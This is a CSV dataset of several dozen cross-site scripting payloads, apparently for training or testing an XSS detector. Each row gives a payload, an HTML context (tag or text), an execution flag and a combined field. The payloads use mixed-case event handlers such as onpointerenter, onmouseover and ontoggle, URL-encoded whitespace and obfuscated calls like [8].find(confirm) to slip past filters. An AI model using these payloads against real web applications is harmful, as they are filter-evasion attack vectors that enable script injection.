payload,context,exec,combined
<A/+/OnpOInteRENter%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/OnpOInteRENter%09=%09confirm()%0dx>v3dm0s
<a/+/OnmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/OnmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<D3v/+/onPOiNtereNTER%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v/+/onPOiNtereNTER%0a=%0aconfirm()>v3dm0s
<Html%0dONPoINteREnTer%0a=%0a[8].find(confirm)%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <Html%0dONPoINteREnTer%0a=%0a[8].find(confirm)%0dx>
<A/+/onMOUSEover%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/onMOUSEover%0a=%0aconfirm()%0dx>v3dm0s
<deTaiLs%0donPointereNteR%0d=%0d(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTaiLs%0donPointereNteR%0d=%0d(prompt)``//
<d3v/+/OnPOIntErEntER%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/OnPOIntErEntER%0a=%0a[8].find(confirm)>v3dm0s
<DeTaILS%0dONpoIntERenter%09=%09(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DeTaILS%0dONpoIntERenter%09=%09(prompt)``%0dx>
<D3V%0dOnPOInterENtER%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0dOnPOInterENtER%09=%09(confirm)()>v3dm0s
<HTML/+/OnMOuseOvEr+=+(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTML/+/OnMOuseOvEr+=+(confirm)()%0dx>
<htmL%09onMouSEOVer%0a=%0a(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htmL%09onMouSEOVer%0a=%0a(confirm)()%0dx>
"<DeTails%0aOntOggLE%0d=%0da=prompt,a()%0dx>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DeTails%0aOntOggLE%0d=%0da=prompt,a()%0dx>"
<a%09ONpointeRentEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09ONpointeRentEr%0a=%0aconfirm()%0dx>v3dm0s
<DeTaIls/+/ontOGgLe%09=%09confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DeTaIls/+/ontOGgLe%09=%09confirm()>
<A%0dOnmOuSeOvEr%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dOnmOuSeOvEr%09=%09confirm()>v3dm0s
<dEtaIlS%0aoNTOGgLe+=+confirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtaIlS%0aoNTOGgLe+=+confirm()%0dx>
<HTML%0aoNpoinTerENTeR+=+(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTML%0aoNpoinTerENTeR+=+(prompt)``//
"<d3V%0aonPOiNtErENTeR+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <d3V%0aonPOiNtErENTeR+=+a=prompt,a()%0dx>v3dm0s"
"<DEtAiLs/+/ONPOINtEREnteR+=+a=prompt,a()%0dx//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DEtAiLs/+/ONPOINtEREnteR+=+a=prompt,a()%0dx//"
<d3V%09ONMOUSeover%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09ONMOUSeover%09=%09[8].find(confirm)>v3dm0s
<A%0dONmOUseOvEr%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0dONmOUseOvEr%0d=%0dconfirm()>v3dm0s
<a/+/onpoiNTerenTEr%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/onpoiNTerenTEr%0a=%0a(prompt)``%0dx>v3dm0s
"<Html%09ONmousEoVEr+=+a=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <Html%09ONmousEoVEr+=+a=prompt,a()>"
<a%09OnMouseOveR%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09OnMouseOveR%09=%09[8].find(confirm)>v3dm0s
<hTmL%09onPOinTErENteR%0d=%0dconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTmL%09onPOinTErENteR%0d=%0dconfirm()%0dx//
<HTML%09oNmouSEover%0a=%0a(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTML%09oNmouSEover%0a=%0a(prompt)``%0dx//
<A/+/oNMouseOVEr%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/oNMouseOVEr%0d=%0dconfirm()>v3dm0s
<D3V%09ONPOinTErENTER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09ONPOinTErENTER%0d=%0dconfirm()%0dx>v3dm0s
"<hTMl%0aoNpOINterENter%0a=%0aa=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <hTMl%0aoNpOINterENter%0a=%0aa=prompt,a()//"
<IMG SRC=x ONERROR=alert(1)>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <IMG SRC=x ONERROR=alert(1)>
<a%09ONmOUSEOVeR%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09ONmOUSEOVeR%0a=%0a(prompt)``%0dx>v3dm0s
<DeTailS%0aonpOinTERENTeR%0a=%0aconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DeTailS%0aonpOinTERENTeR%0a=%0aconfirm()>
<D3v/+/ONpoInteRenteR+=+confirm()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <D3v/+/ONpoInteRenteR+=+confirm()>v3dm0s
<D3v%0dONPOiNtErENTer%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0dONPOiNtErENTer%0a=%0aconfirm()>v3dm0s
<HTml/+/onmouSeoVEr+=+confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTml/+/onmouSeoVEr+=+confirm()>
<HTML/+/onMOuSeOver%0d=%0d(prompt)``>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTML/+/onMOuSeOver%0d=%0d(prompt)``>
<A%09oNpoinTERENtEr%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09oNpoinTERENtEr%0d=%0d(confirm)()%0dx>v3dm0s
<dETailS%0aoNpoinTeReNTER%09=%09(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETailS%0aoNpoinTeReNTER%09=%09(confirm)()>
<DEtails%0doNpOINtErENtEr+=+(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtails%0doNpOINtErENtEr+=+(confirm)()>
<htML%0doNmoUseOvER%0d=%0d(prompt)``>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htML%0doNmoUseOvER%0d=%0d(prompt)``>
<a%0aonMouSeover%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aonMouSeover%0a=%0aconfirm()>v3dm0s
<dETaiLS/+/OnPOinteReNter+=+confirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETaiLS/+/OnPOinteReNter+=+confirm()%0dx//
<deTAILS%0aOnPoINtERenTEr%0d=%0d(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTAILS%0aOnPoINtERenTEr%0d=%0d(confirm)()>
<dEtAIlS%09onTOgGLE%09=%09confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dEtAIlS%09onTOgGLE%09=%09confirm()>
<Details/+/onPOINTeRenTeR%09=%09confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <Details/+/onPOINTeRenTeR%09=%09confirm()//
<d3V%09oNMOuseoveR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09oNMOuseoveR%09=%09(prompt)``%0dx>v3dm0s
<d3V%0aOnPoINTEREnTER+=+(confirm)()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <d3V%0aOnPoINTEREnTER+=+(confirm)()>v3dm0s
